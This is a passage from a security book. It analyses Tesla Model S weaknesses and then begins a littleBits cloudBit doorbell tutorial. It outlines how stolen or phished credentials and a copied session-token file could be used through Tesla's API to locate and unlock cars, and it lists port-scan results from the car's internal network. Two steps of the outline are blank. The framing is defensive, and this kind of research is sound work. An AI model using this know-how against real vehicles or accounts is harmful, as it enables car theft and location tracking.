car manufacturers discussed in this chapter have not invested in analyzing the code to
find and remediate the most fundamental security issues that are well known in the
software development community. In addition analyzing the code, car manufacturers
should design their telematics systems to connect outbound to a trusted destination
rather than accept incoming connections.
In the past two decades, we have learnt the hard way that it is a bad idea to for laptops
and desktops to trust each other just because they are on the same local network. The
probability of one of the devices on a local network eventually being compromised is
high and so it is unacceptable to approve an architecture where devices on the same
network don’t employ end point protection to fend for themselves. Most cars today
employ this architecture because ECUs on the CANBus explicitly trust the integrity and
authenticity of packets. In the past, the risk posed from this design may have been
acceptable because it required physical access to the car. However, as we’ve seen in this
section, research has proved that this approach can be exploited remotely, which can
compromise the physical security and privacy of individuals. The motivation of an at‐
tacker for exploiting these conditions can range from a simple prank, a targeted attack
against an individual, or even terrorism targeting a large group of car owners and pas‐
sengers.
One important point to take away from this section is the fact that the vulnerabilities
being discovered in cars today are rooted in the ignorance of fundamental principles of
memory management, practical cryptography, and basic security controls. As we look
into the future, cars will continue to increase their reliance on wireless communication.
We ought to learn from the mistakes we are committing today so that we can create
vehicles that can keep drivers and passengers safe without exposing vulnerabilities that
can be abused by attackers.
Tesla Model S
The words “Tesla Motors,” “SpaceX,” and “Elon Musk” have become synonymous with
relentless innovation. The eventual goal of SpaceX is to lower the cost of space travel so
that the human race can migrate to other planets. The goal of Tesla motors is to increase
our knowledge of how to generate energy most efficiently and cleanly, and the company
has demonstrated this by releasing one of the safest and fastest four door electric sedans,
Tesla Model S 
| 
195

the Model S. The eventual goal of Tesla is to bring to market an affordable electric car.
Elon Musk, the South African born engineer and executive behind SpaceX and Tesla,
is leading the charge towards the success of both the companies.
Figure 6-4. The Tesla Model S P85+
In the words of Elon Musk: “Well, I didn’t really think Tesla would be successful. I
thought we would most likely fail. But I thought that we at least could address the false
perception that people have that an electric car had to be ugly and slow and boring like
a golf cart”. The Model S is far from a slow golf cart. The P85+ model (Figure 6-4) has
416 horsepower that can take it from 0 to 60 miles per hour in 4.2 seconds. The P85D
model has 691 horsepower and can reach 60 miles per hour in 3.2 seconds. Given that
the car is fully electric, this amount of power is phenomenal and unprecedented.
Every Tesla owner is entitled to free use the hundreds of Tesla Supercharger stations
(Figure 6-5) that are strategically placed across the North America, parts of Asia-Pacific,
and Europe. These stations can charge a car in less than 30 minutes so that the car can
then drive 170 miles. These stations allow Tesla owners to easily make cross-country
trips, and there is no cost for charging. No other electric car company has made such
phenomenal investment in infrastructure and this has positioned Tesla as one of the
leading electric car copanies in the world.
196 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Figure 6-5. Tesla Supercharger Stations
The center display depicted in Figure 6-6 is a popular feature of the car. The display not
only lets you control media, access navigation, and turn on the rear view camera, but it
also lets you adjust the suspension, open the panoramic roof, lock and unlock doors,
and adjust the height and breaking of the vehicle. This is all done via the touch screen.
Tesla Model S 
| 
197

Figure 6-6. The center display in the Tesla Model S
The Model S is commonly referred to as a “computer on wheels” because it is always
connected to the Internet via a 3G connection. New features are delivered as software
198 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

updates. For example, the “hill assist” feature that prevents the car from rolling back‐
wards on a hill was automatically delivered as a software update through the 3G con‐
nection. This is revolutionary since the installation of such features on other vehicles
requires taking the car to a dealer or mechanic.
Tesla is recognized as one of the leading innovators in the field of electric cars and it is
quite likely that Tesla’s architecture will inspire other manufacturers. The always-on 3G
and the ability to update the car’s software makes the Model S a true IoT device that
drivers and passengers will depend upon for their safety and privacy. In this section, we
will take a look at some of the features of the Model S and analyze their design from a
security perspective. This will help us understand how security is being designed into
cars that are going to lead us to the future and what improvements we need to make
along the way.
Locate and Steal a Tesla the Old Fashioned Way
It is common knowledge that weak passwords are a bad idea and most popular online
services require that users pick a password with reasonable complexity. Otherwise, users
tend to select passwords that are easily guessable and attackers exploit this situation to
guess all possible combinations of passwords (also known as a “brute force” attack) to
gain access to the victim’s account. As shown in Figure 6-7, Tesla’s older website enforced
a password complexity of 6 characters containing 1 letter and 1 number. This allowed
for weak passwords such as “password1”, “Tesla123”, and so on. According to a survey,
“123456” is one of the most common passwords while “abc123” is the 14th most com‐
mon password (and this would pass Tesla’s complexity requirement). Furthermore, Te‐
sla’s website (and iPhone app as shown in Figure 6-8) did not originally enforce any
password lockout policy which allowed a potential attacker to guess a target’s password
unlimited times. Once the attacker is able to guess the password, he or she can locate
the physical location of the car by using the iPhone App. The attacker can also unlock
the car, start it, and drive the car using the iPhone App!
Tesla Model S 
| 
199

Figure 6-7. Password complexity requirement of 6 characters inclusive of 1 letter and 1
number
Tesla updated its password complexity requirements in April 2014 to require a mini‐
mum of 8 characters containing 1 letter and 1 number. According to the password
survey, the 25th most common password of “trustno1” would qualify for this require‐
ment. Tesla also implemented a password lockout policy that locks a given account when
6 incorrect login attempts are made. When an account is locked out, the user can request
a password reset link to be emailed to his or her email account on file.
200 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Figure 6-8. Tesla iPhone App
Tesla Model S 
| 
201

Tesla’s increased password complexity requirement and lockout policy may deter some
attackers, but it is not enough to stop determined attackers who can still employ tradi‐
tional tactics such as phishing to obtain the password. All they would have to do is setup
a website that looks like that of the legitimate Tesla website and lure car owners to submit
their credentials. Phishing is relatively easy to carry out and thousands of individuals
fall prey to phishing attacks on a daily basis. In 2011, a phishing attack compromised
the cryptographic keys of the RSA SecureID product, ultimately leading to the com‐
promise of data from Lockheed Martin, one of the largest military contractors. In 2013,
a phishing attack led to the compromise of 110 million customer records and credit
cards at Target.
Communication between the Tesla iPhone App and the Tesla cloud infrastructure has
been documented by the Tesla Model S API project. The iPhone App connects to the
server at portal.vn.teslamotors.com to authenticate and authorize the user based on
credentials. Once logged in, the iPhone App can connect to this server to issue com‐
mands (such as to unlock the car) and receive information about the car (such as the
car’s location). Malicious users can also use this service to automate their work. Assume
a situation where an attacker has been able to capture a few hundred credentials of Tesla
owners. The attacker can write a simple script that can use the API to quickly find the
location of all the cars and unlock them:
1. Login to the stolen account by submitting a request to /login and populating the
user_session field with the victim’s email and the user_session field with the
password.
2. Submit a request to /vehicles to obtain a list of all Tesla cars associated with the
victim’s account.
3.
4.
It is evident that single-factor authentication of just a username and password, even
with password complexity requirements and account lockout policies, are not sufficient
to protect the security of a vehicle since simple and traditional phishing attacks can
allow a malicious user to locate, unlock, and even start the car. Also consider the case
where an attacker has temporary access to the victim’s email. The attacker can simply
request a password reset from the Tesla website and get hold of the user’s Tesla account.
Take a moment to consider the impact of this situation: attackers that have compromised
the email of a Tesla owner can locate and steal the car.
Users have a tendency to re-use their credentials across online services. This creates a
situation where an attacker that has compromised a major website can attempt to try
the same password credentials on Tesla website and iPhone app. We also see situations
of major password leaks on a daily basis which are easy to find by way of projects like
LeakedIn that collect and report on credentials that have been publicly exposed and
202 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

available to the public. An attacker can easily use usernames and passwords from such
leaks and attempt login on the Tesla iPhone app (or automate the process described in
step 2) to locate and unlock cars.
This sets new perspective on how traditional attack vectors can be abused to not only
gain access to the victim’s online information such as email and instant messages, but
they can be leveraged to locate and steal a luxury car. Yet again, the point here is that an
IoT device capable of going 0-60 miles per hour in 3.2 seconds should not be vulnerable
to traditional attacks that are a result of single factor authentication. We also know that
bot-nets relating to malware are always incorporating new methods to locate and pillage
user information. If companies like Tesla continue to implement controls such as tra‐
ditional username and password based authentication, it is quite likely that malware
authors are likely to look for and capture these credentials. Since particular strains of
malware can compromise millions of laptops and desktops, this will create a situation
where a significant number of connected vehicles may be compromised and remotely
accessible by bot-net herders who may be located anywhere in the world.
Social Engineering Tesla Employees and the Quest for Location
Privacy
It’s tough luck for most people who forget their car keys or lock themselves out. Tesla
owners can unlock their cars using the iPhone App in such cases. They can also call
customer service and request that their cars be unlocked in cases where they are unable
to use their iPhones. As shown in Figure 6-9, customers can call customer services to
unlock their cars in cases when other options are not available.
Tesla Model S 
| 
203

Figure 6-9. Tesla customer service can unlock cars remotely
The ability of Tesla employees to be able to unlock cars remotely is certainly helpful to
customers, but it is not clear how customer service is able to authenticate legitimate car
owners. Tesla has not published actual guidelines on exactly what information is re‐
quired for verification. This could create a situation where individuals may attempt to
social engineer Tesla customer support to gain access to the car.
It is also unclear what background checks Tesla employees are subject to prior to be
given the power to unlock any Tesla car. Uber, the app-based cab company, recently
faced scrutiny for violation of their customer’s privacy by their employees who had
access to all customer’s data (internally known as “God View”), including where they
were picked up from and where they were dropped off. In fact, Uber has actually bragged
about being able to identify individuals who travel to locations late at night to engage
in “frisky” behavior on their blog which has since been taken down but an archived
version is available. Since the Model S is always connected via 3G, Tesla can easily collect
information on where every car is at any given time. Yet, Tesla has not communicated
what they have done to make sure only authorized employees have access to the data
and how stored location data is secured against external entities who may seek to gain
unauthorized access to Tesla’s technology infrastructure.
204 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

Handing Out Keys to Strangers
The Tesla iOS App uses a web based API to communicate and send commands to the
car. Tesla has not intended for this API to be directly invoked by 3rd parties. However,
3rd party apps have already started to leverage the Tesla API to build applications. For
example, the Tesla for Glass application lets users monitor and control their Teslas using
Google Glass. In order to setup this application, Google glass owners have to authorize
and add the app. Once this step is complete, the user is redirected to a login page as
shown in Figure 6-10. On this page, the user enters the credentials they use to login to
their Tesla account and the iOS app.
Figure 6-10. Tesla for Glass login page
When the user enters his or her login information and clicks on “CONNECT”, the
username and password is sent to a third party server (teslaglass.appspot.com) as
shown in Figure 6-11! This is basically the electronic equivalent of handing one’s car
key to a complete stranger!
Tesla Model S 
| 
205

Figure 6-11. Tesla website credentials are collected by third party app
The screenshot in Figure 6-11 depicts the Burp Suite tool. This is a
free tool that can be used as a proxy server to capture and modify
HTTP content. In this case, we have used it to capture the HTTP
request to teslaglass.appspot.com to figure out the actual content
being transmitted.
In other words, the “Tesla for Glass” application is not written or sanctioned officially
by Tesla, yet it receives the actual credentials of users that choose to use it. This presents
the risk of malicious third party applications where third party application owners may
abuse this situation to collect credentials of Tesla accounts. As we’ve seen before, these
credentials can allow anyone to locate the cars associated with the account, unlock them,
and even drive the car.
Another risk imposed by this situation is the possibility of the third party infrastructure
being compromised. This issue has been raised in the community by George Reese.
Elon Musk has confirmed that Tesla has plans to eventually release an SDK for 3rd party
developers. It is likely that the Tesla sponsored solution includes an SDK, access to a
remote API, local sandbox, OAUTH like authorization functionality, and a vetting pro‐
cess that draws inspiration from the Apple App Store.
Perhaps Tesla cannot be explicitly and fully blamed for it’s customers handing over their
credentials to third parties. However, it is the nature of traditional password based sys‐
tems that give arise to outcomes and situations where this becomes an issue. Rather
206 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

than place the blame on car owners (who are in most cases broadcasting their credentials
to third party applications unintentionally), the only way this issue can be remedied is
by Tesla offering an ecosystem where the secure development and vetting of applications
is defined and encouraged.
Or Just Borrow Someone’s Phone
The Tesla iOS app stores a session token obtained from successful authentication with
the API in the Library/Cookies/ directory within the App in the file called Cookies.bi
narycookies. As shown in Figure 6-12, anyone with physical access to a Tesla owner’s
iPhone can grab this file using a tool such as PhoneView.
Figure 6-12. The Cookies.binarycookies file on the iPhone contains the authentica‐
tion token.
Anyone with temporary access to a Tesla owner’s phone can steal the content of this file
to make direct requests to control the API functionality. This value of this session token
has been documented to be valid for 3 months at a time.
The probability of this issue is low because it requires physical access to the phone. Note,
however, that unlike temporary access to a physical key (the role of which is played by
the phone), the potential malicious entity will have prolonged access to the functionality
even after returning the phone.
Yet again, the risk posed to owners is due to the reliance on traditional username and
password credentials which are likely to rely upon validated session tokens such as these
so that user’s don’t have to enter their password every time they launch the iPhone app.
Tesla Model S 
| 
207

One simple and elegant way to improve this situation is for Tesla and other car manu‐
facturers to leverage built-in authentication and authorization functionality in operat‐
ing systems such as Apple’s iOS. The Touch ID fingerprint sensor in the most recent
iPhone models securely saves partial fingerprint data that can easily and quickly verified.
Apple has opened up the use of the Touch ID API to third party developers. Tesla can
and should use this framework to further protect the security of their owner’s by re‐
quiring the use of Touch ID for critical use-cases such as unlocking and starting the car.
Additional Information and Potential Low Hanging Fruit
We know that the Model S maintains a 3G connection to the Tesla infrastructure. The
car can also hop on to a local WiFi network, which makes it easier for to intercept the
network traffic that is travelling outbound from the car to Tesla. As shown in
Figure 6-13, the car uses the OpenVPN protocol to encrypt network traffic between the
car and the Tesla servers.
Figure 6-13. Network capture of outbound connection from Tesla Model S on Wi-Fi
Earlier in the chapter, we looked at how the car analyzed by researchers in San Diego
and University of Washington were able to exploit a condition where the car answered
to incoming phone calls instead of connecting outbound to a trusted destination. The
use of OpenVPN by Tesla to initiate an outbound connection to a known service is more
208 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

secure, yet this area is open to further research and may lead to security and privacy
issues depending upon a detailed analysis of the configuration. The outgoing connec‐
tion using OpenVPN can be configured using pre-shared keys, or by using a username
and password, or using certificates. It will be interesting to see where in the internal file
system this information is located. Once this information is obtained, a potential in‐
truder could test the internal network infrastructure of the OpenVPN end-point and
also the integrity of how software updates are performed.
In addition to 3G and WiFi, The Model S also has a 4-pin connector on the left of the
dashboard. A M12 to RJ45 adapter can be used to connect a laptop to this port. Users
on the teslamotorsclub.com forum have reported various information about the internal
network after having plugged into it, as shown in Figure 6-14.
Figure 6-14. Forum discussion about Tesla Model S’ internal network
Upon scanning the internal network after connecting through the RJ45 adapter, the
following IP addresses and services have been found to exist in the Model S:
Tesla Model S 
| 
209

• Potential center console with IP address of 192.168.90.100 and the following
services open:
    22/tcp open ssh
    53/tcp open domain
    80/tcp open http
    111/tcp open rpcbind
    2049/tcp open nfs
    6000/tcp open X11
    MAC Address: FA:9E:70:EA:xx:xx (Unknown)
• Dashboard screen with IP address of 192.168.90.101 and the following services
open:
    22/tcp open ssh
    111/tcp open rpcbind
    6000/tcp open X11
    MAC Address: 36:C4:1F:2A:xx:xx (Unknown)
• Another device with IP address of 192.168.190.102 with the following services
open:
    23/tcp open telnet
    1050/tcp open java-or-OTGfileshare
    MAC Address: 00:00:A7:01:xx:xx (Network Computing Devices)
• The SSH service on 192.168.90.100 has the banner of SSH-2.0-OpenSSH_5.5p1
Debian-4ubuntu4
• The DNS on 192.168.90.100 is of version dnsmasq-2.58
• The HTTP server on 192.1168.90.100 appears to expose /nowplaying.png which
is the album art displayed on the dashboard.
• The NFS service on 192.168.90.100 exposes /opt/navigon directory which con‐
tains the following structure:
    dr-xr-xr-x 5 1111 1111 4096 Mar 21 2013 .
    drwxrwxrwt 20 root root 20480 Mar 18 17:01 ..
    dr-xr-xr-x 4 1111 1111 4096 Mar 21 2013 EU (Contains /maps and /data)
    dr-xr-xr-x 2 1111 1111 4096 Mar 21 2013 lost+found
    -r--r--r-- 1 1111 1111 7244 Mar 21 2013 MD5SUM-ALL
    dr-xr-xr-x 2 1111 1111 4096 Mar 21 2013 sound
    -r--r--r-- 1 1111 1111 150 Mar 21 2013 VERSION
    /VERSION:
       UI/rebase/5.0-to-master-238-g734c31d7,EU
210 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

       NTQ312_EU,14.9.1_RC1_sound.tgz
       build/upgrade/mknav-EU-ext3.sh
It is fascinating that the internal IP network in the Model S contains IP addresses that
appear to be running the Linux operating system (Ubuntu).
There have not been any public reports of these services being abused. However, this
information is worth mentioning since it gives us perspective on the IP based architec‐
ture in the Model S. It is likely that additional researchers as well as malicious parties
will be drawn to this IP based internal network for potential attack vectors and vulner‐
abilities that may lie undiscovered.
Auto Pilot and the Autonomous Car
In October of 2014, Tesla announced that all new Model S cars will contain hardware
to enable the “Auto Pilot” functionality as a software update that will be issued to the
cars in the coming months (other cars also have similar features, however, we will stick
to Tesla since the Model S is our focus). Here is the description from Tesla:
“The launch of Dual Motor Model S coincides with the introduction of a standard hard‐
ware package that will enable autopilot functionality. Every single Model S now rolling
out of the factory includes a forward radar, 12 long range ultrasonic sensors positioned
to sense 16 feet around the car in every direction at all speeds, a forward looking camera,
and a high precision, digitally controlled electric assist braking system.
Building on this hardware with future software releases, we will deliver a range of active
safety features, using digital control of motors, brakes, and steering to avoid collisions
from the front, sides, or from leaving the road.
Model S will be able to steer to stay within a lane, change lanes with the simple tap of a
turn signal, and manage speed by reading road signs and using active, traffic aware cruise
control.”
Tesla is careful to note that this feature is not completely autonomous, to quote:
“Our goal with the introduction of this new hardware and software is not to enable driv‐
erless cars, which are still years away from becoming a reality. Our system is called Au‐
topilot because it’s similar to systems that pilots use to increase comfort and safety when
conditions are clear. Tesla’s Autopilot is a way to relieve drivers of the most boring and
potentially dangerous aspects of road travel – but the driver is still responsible for, and
ultimately in control of, the car.”
And to sum it up:
“The Autopilot hardware opens up some exciting long term possibilities. Imagine having
your car check your calendar in the morning (a feature introduced in Software v6.0),
calculate travel time to your first appointment based on real time traffic data, automat‐
ically open the garage door with Homelink, carefully back out of a tight garage, and pull
Tesla Model S 
| 
211

up to your door ready for your commute. Of course, it could also warm or cool your car
to your preferences and select your favorite morning news stream.”
These new features quite wonderful and is likely to decrease accidents in the cases where
drivers may be distracted. Companies such as Google, are working on completely au‐
tonomous cars that don’t even have a steering wheel. It is evident that “Auto Pilot” ability
will take us towards a future where completely self driving vehicles will be around us.
As we look into the future, the following new risks are likely to be introduced into the
car security ecosystem whose results are bound to be fascinating to analyze:
• Legal precedence and liability: Tesla as explicitly mentioned that the driver is “re‐
sponsible for, and ultimately in control of (the car)”. As we move into completely
autonomous driving, it will be interesting to see which parties are found to be liable
for damages and accidents in the future. Could the car company be held liable if an
accident is caused by a hardware or software error? The legal terms and conditions,
as well as the difference of legal opinion between the states in the USA and other
countries, combined with actual mishaps is likely to shape our understanding of
liability and ultimate responsibility.
• The impact of software bugs: As consumers, we have all come across a software
glitch at some point in our lives that may have delayed our online shopping, pre‐
vented access to email, or perhaps the ability to print a boarding pass. Now imagine
a software glitch in a feature such as the “Auto Pilot” which has the ability to conduct
an actual lane change. Such a glitch could have physical consequences to the pas‐
sengers of the car and nearby cars that can result in physical harm.
• Vehicle to vehicle communications: As consumer cars become truly autonomous,
they will need to implement a peer to peer communication protocol allowing nearby
cars to negotiate turns, manage flow of traffic, and alerting each other to road con‐
ditions. There are two buzz-words in the industry today that attempt to capture this
need, mainly V2V (Vehicle to Vehicle) and V2I (Vehicle to Infrastructure). The
combination of V2V and V2I is commonly referred to as V2X. The US Department
of Transportation (DOT) and the National Highway Traffic Safety Administration
(NHTSA) have set up a website to announce upcoming and proposed laws that
automotive manufacturers will be expected to adhere to. As more and more vehicles
communicate with each other an with the underlying infrastructure provided by
the government (to manage traffic and collect tolls, for example), the attack surface
available to malicious entities will increase. In response to government mandates,
car manufacturers are going to design solutions that may initially contain security
vulnerabilities. The NHTSA has issued a proposal to obtain feedback from the
industry on how to securely implement a V2V communication system. This attack
surface is going be attractive to the entire spectrum of actors: hardware and software
tinkerers, pranksters, nation states, and groups that engage in terrorism.
212 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

The Tesla Model S is a great car and a fantastic product of innovation. Owners of Tesla
as well as other cars are increasingly relying on information security to protect the
physical safety of their loved ones and their belongings. Given the serious nature of this
topic, we know we can’t attempt to secure our vehicles the way we have attempted to
secure our workstations at home in the past by relying on static passwords and trusted
networks. The implications to physical security and privacy in this context have raised
stakes to the next level.
Tesla has demonstrated fantastic leaps in innovation that is bound to inspire other car
manufacturers. It is hoped that this chapter will encourage car owners to think deeply
about doing their part as well as for companies like Tesla to have an open dialogue with
it’s owners on what they are doing to take security seriously.
Conclusion
Our reliance on car for our livelihood is unquestionable. Besides being in control of our
own vehicle, we also rely on the faculties of other drivers in the road and the safety
features of the cars they are driving. In this chapter, we’ve seen firm evidence of the
existing (or lack thereof) security mechanisms designed in cars that use and depend on
wireless communication to support privacy and security features that are important to
passengers.
In the case of the TPMS analysis, it is evident that fundamental security design principles
were not baked in to the design of the architecture. It is quite startling to be able to send
rogue tire pressure alerts to nearby cars and to be able to abuse the design to potentially
track particular vehicles thereby invading the privacy of citizens who are likely not even
aware that their cars are using insecure mechanisms to transmit tire pressure data.
The ability to remotely take over a telematics ECU is quite phenomenal. We’ve seen that
the CANBus architecture explicitly trusts every other ECU so a simple successful cellular
attack can be lethal giving the spectrum of malicious actors control of the car. It is
unnerving to uncover that most of the vulnerabilities found were a result of basic soft‐
ware mistakes such as buffer overflows, the reliance on obscurity, and improper im‐
plementation of cryptography.
The Tesla Model S is indeed a set of computer on wheels, fully electric and always
connected to the Internet. At 691 horsepower, the power of this beast probably makes
it one of the fastest consumer grade Internet of Things available for purchase. Despite
being a pleasure to drive and lauded as one of the most innovative cars ever produced,
owners should be concerned that this luxury vehicle provides remote unlock and start
functionality which is protected by a single-factor password system that the security
community has known to be easily susceptible to social engineering, phishing, and
malware attacks. This can lead to a situation where cars such as the Tesla may be ex‐
ploited by a myriad of malicious actors such as pranksters or state sponsored activists
Conclusion 
| 
213

for various motives. In addition, it is unclear to owners what mechanisms and processes
are being employed by Tesla to prevent social engineering of their own employees and
also to protect the location privacy of car owners.
Cars in the market today are vulnerable to software flaws that can be mitigated by the
inclusion of security design and analysis earlier on and throughout the product devel‐
opment process. We out to pay careful attention and strive to remediate issues that can
put our physical safety and privacy at risk. It’s probably not a bad guess to insist that our
exposure to the attack surface posed by connected cars that take us to the world of
autonomous is bound to multiply should we not take considerable action now.
214 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

CHAPTER 7
Secure Prototyping: littleBits and cloudBits
With the announcement of the iPhone in 2007, Apple single handedly disrupted the
smart phone industry with the first generation version of the product. From an external
viewpoint, the iPhone announced in 2007 may very well have been the first version of
the finished product visible to the public. However, the initial product idea that even‐
tually led to the iPhone was a touch-sensitive tablet that would allow users to do away
with a physical keyboard. Once Steve Jobs saw the prototype of the tablet, he decided
he wanted to implement the technology on a smart phone first.
Prototypes help us think through the relevancy of our ideas by helping us focus our
intellectual capacities on the intention of our conceived product. The great thing about
creating prototypes is that the process can help us quickly realize potential roadblocks
to the design of the final product early on. Prototyping, just like in the case of Apple
and Jobs, can also help us test different versions of our idea that may turn into a whole
other form factor than what we originally planned.
There are numerous platforms and kits available that allow individuals to prototype
ideas for IoT products at low cost and effort. In this chapter, we are going to focus on
the littleBits platform since it is one of the simplest and most elegant prototyping sol‐
utions on the market. The littleBits module includes magnets that can be snapped to‐
gether like Legos, which allows us to construct a prototype in mere seconds. We will use
the cloudBit module to facilitate a simple doorbell that can send alerts via SMS message.
Once we have completed designing our prototype, we will take a look at security issues
that are relevant to the littleBits platform so that we are aware of security controls we
will have to put in place during subsequent iterations of our product prior to production.
The goal of this exercise is to siumlate real world processes companies go through from
initial prototype to production so we can think through how to embed security controls
at the right times.
215

The effort required to secure an IoT device includes context such as how the product
may be used as well as what type of threat agents are likely to abuse it for malicious
purposes. For example, a sophisticated gang of terrorists may want to gain and maintain
access to IoT devices that serve critical infrastructure such as connected cars and lighting
systems. On the other hand, threat agents such as cyber bullies are likely to abuse device
functionalities to harass others. In this chapter we will step through designing a proto‐
type and begin to formulate our thinking around security controls that leverage use
cases and the intentions of potential threat agents.
Introducing the cloudBit Starter Kit
The cloudBit starter kit is a great way to start tinkering with IoT product ideas that
require remote connectivity, i.e. communication via the Internet. It is a simple and
elegant kit that can be used to brainstorm the feasibility of ideas and test out use cases
prior to expending too much effort on a full-blown solution. The kit consists of 5 pro‐
totyping modules and the USB power module (Figure 7-1).
Figure 7-1. The USB power module
The USB power module powers the cloudBit projects. It can be powered using a USB
cable or a wall adapter (Figure 7-2), both of which are included in the kit.
216 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-2. The USB power adapter and cable
The long LED (Light Emitting Diode) module can be used to provide lighting. It is called
“long” because the light is tethered by a cable, which allows you to place the light in
different places within the body of the prototype hardware or another object. The kit
also includes the servo, a controllable motor that swings back and forth or continuously
in a specific direction (clockwise or anti-clockwise). The sound trigger module listens
to noise levels in the environment and can be programmed to activate other modules
when the noise rises above a defined threshold. The button module (Figure 7-3), as the
name suggests, is a simple button that when pressed activates other modules.
Introducing the cloudBit Starter Kit 
| 
217

Figure 7-3. The button module
The cloudBit module (Figure 7-4) is clearly the star of the show. It is basically a small
computer that is powered by the Linux operating system. It includes WiFi functionality
that can be easily configured to connect to the free littleBits cloud infrastructure that
we will learn about in the following sections.
218 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-4. The cloudBit module
Once connected, the cloudBit module sends data to the littleBits cloud, which can be
used by remote applications to control modules connected to the cloudBit.
Setting Up the cloudBit
The first order of business is to set up the cloudBit to connect to WiFi so that it can
contact and connect with the littleBits cloud infrastructure. To do this, we need to first
sign up for a littleBits account (https://littlebits.cc/signup) as shown in Figure 7-5.
Introducing the cloudBit Starter Kit 
| 
219

Figure 7-5. Signing up for a littleBits account
After signing up for an account, we can name our cloudBit module by going to http://
control.littlebitscloud.cc (Figure 7-6).
220 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-6. Naming our cloudBit module
Once we have named our module, we are asked to power on the cloudBit (Figure 7-7).
To do that, attach the wall adapter to the USB Power module, and then attach the USB
Power module to the cloudBit.
Note that littleBits modules have magnets on their sides making it easy for them to snap
together with other modules. They are also color coded. Blue colored modules are power
modules, such as the USB power module, that help power the circuit. Red indicates
Introducing the cloudBit Starter Kit 
| 
221

input; these modules accept input from the user or the environment (example: Button).
These modules in turn send signals to following modules that are colored green to
indicate output. These modules perform an action, such as the servo, which is a motor
that can rotate in a particular direction. Orange colored modules are called “wires”; they
are used to expand the reach of the project, such as the cloudBit module, which is used
to provide remote connectivity to the prototype. The order in which the modules are
snapped next to each other is important: power modules always come first and input
modules only effect output modules that come after them.
Once the cloudBit is powered on, the light underneath the word “Status” on the module
will start flashing. Press the button titled “Status light is flashing” Figure 7-7.
222 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-7. Booting up the cloudBit
We now see the screen shown in Figure 7-8.
Introducing the cloudBit Starter Kit 
| 
223

Figure 7-8. Configuring cloudBit
Per the instructions, hold down the setup button until the light blinks blue, and then
let go until it stabilizes to a steady blue color. Once that happens, click the “Blue light is
steady” button shown in Figure 7-8. At this point, the cloudBit will start up it’s own WiFi
network in the form of “littleBits_Cloud_…” that we can connect to (see Figure 7-9).
224 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-9. Connecting to the cloudBit WiFi network
Once we have connected to the WiFi network exposed by the cloudBit, our browser will
locate the module and query it for other WiFi networks it can detect (Figure 7-10).
Introducing the cloudBit Starter Kit 
| 
225

Figure 7-10. WiFi networks detected by cloudBit
At this point, we will select our home WiFi network, which is TouchOfClass in this
example (see Figure 7-11).
226 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-11. Selecting WiFi network and entering credentials
After clicking on “Save”, we are asked to connect back to our home WiFi network (Tou‐
chOfClass). The cloudBits module is now configured and connected to the littleBits
cloud infrastructure.
Designing the SMS Doorbell
Now that we have our cloudBit module configured, we can use it to prototype a doorbell
that sends us an SMS message when the doorbell is pressed. We will use the IFTTT (If
This Then That) platform first mentioned in Chapter 1 to handle the interaction be‐
tween the cloudBit and the phone that will receive the SMS message. Go to https://
ifttt.com/join to create an IFTTT account if you don’t already have one. After that, go
to https://ifttt.com/littlebits to activate the littleBits channel. Activiating the channel will
authorize IFTTT to interact with the cloudBit using the littleBits network (Figure 7-12).
Introducing the cloudBit Starter Kit 
| 
227

Figure 7-12. Turning on the littleBits Channel on IFTTT
Now we are ready to create an IFTTT recipe that will send an SMS to our phone when
our doorbell is pressed. Go to https://ifttt.com/myrecipes/personal/new to create a new
recipe. Click on “this” and type in “little” to search from the list of triggers. (Triggers are
basically events that trigger a reaction, i.e. they are the “this” part of an IFTTT recipe,
while an action channel [example: SMS] is the “that” part of the recipe.) Select littleBits
228 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

from the list, and then click on “Input received,” which will make the recipe run when
another input module (such as a button module) sends a signal to the cloudBit. Select
our cloudBit named SMS_Door_Bell (Figure 7-6) from the list of authorized cloudBits,
and then click on Create Trigger (Figure 7-13).
Figure 7-13. Selecting our cloudBit for the recipe
Next, click on “that” (Figure 7-14).
Figure 7-14. Click on “that” to select our cloudBit as the recipe trigger
Introducing the cloudBit Starter Kit 
| 
229

Now, type SMS (Figure 7-15) and choose it as an action channel.
Figure 7-15. Selecting the SMS action channel
Click on Activate to activate the SMS channel. You will be asked to enter a valid cellular
phone number capable of receiving SMS messages (Figure 7-16). Click on Send PIN to
have the number sent to your phone. Once you receive the PIN, enter it into the website,
click on Activate, and then click on Done below the “SMS Activated!” message. Then
click on “Continue to the next step”.
230 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-16. Activating the SMS action channel
Now click on “Send me an SMS” under the “Choose your Action” section. You can now
edit the message you will recieve when someone rings our doorbell. In Figure 7-17, we
Introducing the cloudBit Starter Kit 
| 
231

see an example of a custom SMS message that will result in the text “Hey, someone
pressed me! -Sincerely, SMS_Door_Bell”.
Figure 7-17. Customizing the trigger SMS message
Click on Create Action, pick a title for the recipe, and then click on Create Recipe. That’s
it—our recipe is active!
Oops, We Forgot the Button!
Wait a second. We forgot to add the button module to represent the doorbell. Oops!
Our project is not much of a doorbell if there isn’t an actual button to represent a door‐
bell. But fear not: instances like these are the reason that littleBits is such an elegant
prototyping platform. We are going to add in a button without losing any of the work
we have already done.
If you look closely at the button module (Figure 7-3), you will see that it has a right
arrow on its top. This means that the module on to its right will receive a trigger when
the button is pressed. Therefore, the button module needs to be on the left side of our
cloudBit.
232 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Pull the cloudBit away from the USB power module; this will power it off. Connect the
button module to the power module, and then connect the cloudBit on the right side
